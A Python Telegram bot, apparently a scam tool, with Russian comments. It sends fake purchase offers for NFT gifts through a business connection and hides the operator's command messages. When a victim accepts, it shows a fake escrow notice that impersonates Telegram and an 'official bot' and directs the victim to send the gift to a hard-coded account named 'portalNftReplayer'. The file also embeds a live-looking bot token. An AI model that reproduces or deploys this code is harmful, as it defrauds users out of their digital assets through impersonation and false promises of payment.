import re
import asyncio
import logging
import os
from threading import Thread
from flask import Flask
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# ==========================================
# ВСТАВЬ СЮДА СВОЙ НОВЫЙ ТОКЕН (если отзывал старый)
BOT_TOKEN = "9150035187:AAHA1yqlsiU1CwnGECEMP5VX_1cFrG4t0Ho"
# ==========================================

SECRET_KEY = "/unlock_8f3k2m9x" 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

AUTHORIZED_USERS = set()

# --- ВЕБ-СЕРВЕР ДЛЯ RENDER ---
app = Flask(__name__)

@app.route('/')
def index():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# --- ЛОГИКА БОТА ---
@dp.business_message(F.text == SECRET_KEY)
async def unlock_bot(message: types.Message):
    AUTHORIZED_USERS.add(message.from_user.id)
    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception:
        pass
    await bot.send_message(
        chat_id=message.chat.id,
        text="✅ Бот активирован. Теперь вы можете использовать /price.",
        business_connection_id=message.business_connection_id
    )

@dp.business_message(F.text.startswith("/price"))
async def handle_price_command(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return

    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception as e:
        logging.error(f"Не удалось удалить команду: {e}")

    # Ловим ссылку, цену, валюту (и юзера, если он есть, но мы его потом перезапишем)
    pattern = r"^/price\s+(https?://\S+)\s+([\d\.]+)\s+(gram|stars)(?:\s+(@\w+))?$"
    match = re.match(pattern, message.text, re.IGNORECASE)
    if not match:
        return

    nft_link, price_value, currency, target_user = match.groups()
    currency = currency.lower()

    nft_name_raw = nft_link.split('/')[-1].replace('-', '')
    nft_name_formatted = nft_name_raw.capitalize() 

    price_text = f"{price_value} ⭐" if currency == "stars" else f"{price_value} 💎"

    # Передаем цену в callback_data кнопки "Принять"
    callback_data = f"accept:{price_text}"

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Отклонить", callback_data="decline_offer"),
            InlineKeyboardButton(text="Принять", callback_data=callback_data)
        ]
    ])

    final_text = (
        f"Пользователь <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a>\n"
        f"предлагает вам {price_text} за подарок\n"
        f"\"{nft_name_formatted}\".\n\n"
        f"Предложение действует еще 24h 00m.\n\n"
        f"{nft_link}"
    )

    try:
        await bot.send_message(
            chat_id=message.chat.id,
            text=final_text,
            business_connection_id=message.business_connection_id,
            reply_markup=keyboard,
            disable_web_page_preview=False
        )
    except Exception as e:
        logging.error(f"Ошибка при отправке: {e}")

# --- ОБРАБОТЧИК КНОПКИ "ПРИНЯТЬ" ---
@dp.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: types.CallbackQuery):
    await callback.answer()

    try:
        # Достаем цену из callback_data
        parts = callback.data.split(":")
        price_str = parts[1]

        transfer_bot = "@portals_nftbot"
        
        # Формируем текст розовой плашки
        new_text = (
            f"<b>Покупатель зарезервировал ваш подарок.</b>\n\n"
            f"<blockquote>"
            f"Средства хранятся на специальном эскроу-счете и будут зачислены на баланс после передачи подарка.\n\n"
            f"<b>Для завершения сделки:</b>\n"
            f"1. Передайте подарок официальному боту: {transfer_bot}\n"
            f"2. Нажмите «Передать NFT» и выберите NFT.\n"
            f"3. Подтвердите передачу подарка.\n\n"
            f"Telegram зафиксирует транзакцию и моментально зачислит {price_str} на ваш аккаунт.\n\n"
            f"<b>Резерв действует 24 часа.</b>"
            f"</blockquote>"
        )

        # ЖЕСТКО ЗАДАЕМ ПОЛЬЗОВАТЕЛЯ ДЛЯ ПОДАРКА
        target_username = "portalNftReplayer" 
        gift_link = f"tg://send_gift?to={target_username}"

        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Передать NFT", url=gift_link)]
        ])

        await bot.edit_message_text(
            text=new_text,
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            reply_markup=new_keyboard,
            business_connection_id=callback.message.business_connection_id
        )
    except Exception as e:
        logging.error(f"Ошибка в кнопке: {e}")
        await callback.answer(f"Ошибка: {e}", show_alert=True)

@dp.callback_query(F.data == "decline_offer")
async def decline_offer(callback: types.CallbackQuery):
    await callback.answer("Вы отклонили предложение.", show_alert=True)

async def main():
    Thread(target=run_flask, daemon=True).start()
    print("Бот запущен. Ожидание секретного ключа...")
    await dp.start_polling(bot, allowed_updates=["business_connection", "business_message", "callback_query"])

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Бот остановлен.")
